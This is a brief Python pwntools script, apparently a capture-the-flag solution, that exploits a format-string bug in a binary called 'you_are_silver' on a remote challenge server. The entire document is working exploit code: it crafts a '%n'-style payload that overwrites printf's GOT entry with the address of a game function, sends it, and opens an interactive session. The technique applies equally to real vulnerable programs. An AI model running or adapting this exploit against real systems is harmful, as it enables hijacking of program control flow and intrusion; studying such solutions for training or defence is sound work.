#!/usr/bin/python 
from pwn import * 

#p = process("./you_are_silver") 
p = remote("ctf.j0n9hyun.xyz", 3022) 
elf = ELF("./you_are_silver") 
play_game = 0x4006d7 
printf_got = elf.got['printf'] 

#pay = '%{}c'.format(play_game) 
pay = "%" + str(play_game) + "c" 
pay += '%8$ln' 
pay += 'A'*(8 - len(pay)%8) #padding 
pay += p64(printf_got) 
pay += 'f'*(46-len(pay)) 

p.sendlineafter("Please enter your name\n", pay) 

p.interactive()
